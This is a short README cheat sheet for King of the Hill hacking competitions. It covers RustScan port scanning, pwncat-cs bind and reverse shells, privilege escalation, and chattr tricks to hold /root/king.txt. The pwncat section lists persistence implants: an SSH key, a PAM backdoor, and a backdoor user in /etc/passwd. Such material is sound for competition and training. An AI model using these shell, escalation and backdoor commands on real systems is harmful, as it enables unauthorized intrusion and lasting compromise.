# KoTH-Tools

*Collection of KoTH tools and techniques, Enjoy!*

---------------

1. [Port Scanning](#portscanning)
    - RustScan
2. [Shells](#shells)
    - Pwncat
3. [king.txt](#kingtxt)
    - Pwncat

---------------

PortScanning
====================
* [RustScan](https://rustscan.github.io/RustScan/)

  *Port scanning tool, faster than NMAP.*
  
  1. Git clone the repo.
  2. Install Rust. You can do this with `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh` which I took from the Rust website https://www.rust-lang.org/tools/install
  3. cd into the Git repo, and run `cargo build --release`
  4. The binary is located at `target/release/rustscan`
  5. Symlink to the binary or something. Whatever you want!
  
    `rustscan -b 500 -T 1500 IPADDRESS`
    
Shells
====================
* [Pwncat](https://pwncat.readthedocs.io/)

  *Post exploitation shell wrapper*

  `pip install pwncat-cs`

  Bind shell:`pwncat-cs 192.168.1.1:4444`

  Encrypted bind shell:`pwncat-cs --ssl 192.168.1.1:4444`

  Catching reverse shell:`pwncat-cs -lp 4444`

  Encrypted reverse shell:`pwncat-cs --ssl --ssl-cert cert.pem --ssl-key cert.pem -lp 4444`

  Connect ssh server:`pwncat-cs root@192.168.1.1`

  Windows target:`pwncat-cs -m windows 192.168.1.1 4444`

  Enumerate:`(local) pwncat$ run enumerate`

  Generate target report:`(local) pwncat$ run report`

  PrivEsc root:`(local) pwncat$ escalate`

    PrivEsc specific user:`(local) pwncat$ escalate -u USER`

    Persistence pub key current user:`(local) pwncat$ run implant.authorized_key key=./id_rsa`

    Persistence pam backdoor module:`(local) pwncat$ run implant.pam password=PASSWORD`

    Persistence backdoor user within /etc/passwd:`(local) pwncat$ run implant.passwd backdoor_user=pwncat backdoor_pass=pwncat`

    Persistence list implants:`(local) pwncat$ run implant list`

    Persistence escalate using implant:`(local) pwncat$ run implant escalate`

    Persistence remove implant:`(local) pwncat$ run implant remove`

    Persistence reconnect to implant:`pwncat-cs --list` + `pwncat-cs IMPLANT_ID`
  
  

Kingtxt
====================
* [chattr](https://www.man7.org/linux/man-pages/man1/chattr.1.html)
  
    Add name to king.txt:`echo "USERNAME" > /root/king.txt`
    
    If errors, remove immutable bit:`chattr -i /root/king.txt`
    
    *Strat 1* - King.txt name persistence:`chattr +i /root/king.txt`
    
    *Strat 2* - Make file only appendable:`chattr +a /root/king.txt`
    
    *Strat 2* - Now can only append not write:`echo "USERNAME" >> /root/king.txt`
    
  
